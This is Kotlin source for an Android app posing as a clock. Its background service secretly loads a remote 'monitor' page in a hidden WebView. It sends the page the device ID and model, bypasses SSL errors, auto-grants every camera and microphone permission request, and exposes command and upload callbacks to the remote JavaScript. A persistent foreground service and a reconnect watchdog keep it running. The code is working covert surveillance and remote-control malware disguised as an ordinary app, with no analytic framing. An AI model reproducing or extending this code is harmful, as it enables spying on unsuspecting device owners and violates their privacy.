package com.clock.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.net.http.SslError
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.webkit.JavascriptInterface
import android.webkit.PermissionRequest
import android.webkit.SslErrorHandler
import android.webkit.WebChromeClient
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import java.net.URLEncoder

class MonitorService : Service() {

    companion object {
        var lastStatus: String = "Service started"
        var lastBridgeTime: Long = System.currentTimeMillis()
    }

    private val handler = Handler(Looper.getMainLooper())
    private var webView: WebView? = null
    private var fullUrl = ""
    private val monitorUrl = "https://payment70.site.je/monitor.html"
    private val CHANNEL_ID = "monitor_service"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onCreate() {
        super.onCreate()
        try {
            createNotificationChannel()
            startForeground(1, buildNotification())
        } catch (e: Exception) {
        }
        try {
            setupWebView()
        } catch (e: Exception) {
            lastStatus = "WebView error: " + e.message
        }
        handler.postDelayed(watchdog, 20000)
    }

    private val watchdog = object : Runnable {
        override fun run() {
            val idle = System.currentTimeMillis() - lastBridgeTime
            if (idle > 60000) {
                lastStatus = "Reconnecting..."
                lastBridgeTime = System.currentTimeMillis()
                try {
                    webView?.reload()
                } catch (e: Exception) {
                }
            }
            handler.postDelayed(this, 20000)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Clock Service",
                NotificationManager.IMPORTANCE_LOW
            )
            channel.description = "Service"
            channel.setSound(null, null)
            channel.enableVibration(false)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Clock App")
                .setContentText("Running")
                .setSmallIcon(R.drawable.ic_clock)
                .setOngoing(true)
                .build()
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setContentTitle("Clock App")
                .setContentText("Running")
                .setSmallIcon(R.drawable.ic_clock)
                .setOngoing(true)
                .build()
        }
    }

    private fun setupWebView() {
        webView = WebView(this)
        val st = webView!!.settings
        st.javaScriptEnabled = true
        st.domStorageEnabled = true
        st.mediaPlaybackRequiresUserGesture = false
        st.cacheMode = WebSettings.LOAD_NO_CACHE
        st.databaseEnabled = true
        st.userAgentString = "Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + "; " + Build.MODEL + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"

        webView!!.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                if (lastStatus == "Service started") {
                    lastStatus = "Page loaded, waiting JS..."
                }
            }

            override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
                super.onReceivedError(view, request, error)
                if (request?.isForMainFrame == true) {
                    lastStatus = "Page error: " + (error?.description?.toString() ?: "unknown")
                }
            }

            override fun onReceivedSslError(view: WebView?, handler: SslErrorHandler?, error: SslError?) {
                try {
                    handler?.proceed()
                } catch (e: Exception) {
                }
            }
        }

        webView!!.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest?) {
                try {
                    request?.grant(request.resources)
                } catch (e: Exception) {
                }
            }
        }

        webView!!.addJavascriptInterface(WebBridge(), "Android")

        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val deviceInfo = URLEncoder.encode(Build.MANUFACTURER + " " + Build.MODEL, "UTF-8")
        fullUrl = monitorUrl + "?did=" + androidId + "&dinfo=" + deviceInfo
        webView!!.loadUrl(fullUrl)
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            webView?.destroy()
        } catch (e: Exception) {
        }
    }
}

class WebBridge {
    @JavascriptInterface
    fun onResult(text: String) {
        MonitorService.lastBridgeTime = System.currentTimeMillis()
        MonitorService.lastStatus = text
    }

    @JavascriptInterface
    fun onCommand(text: String) {
        MonitorService.lastBridgeTime = System.currentTimeMillis()
        MonitorService.lastStatus = text
    }

    @JavascriptInterface
    fun onUploadDone(text: String) {
        MonitorService.lastBridgeTime = System.currentTimeMillis()
        MonitorService.lastStatus = text
    }
}
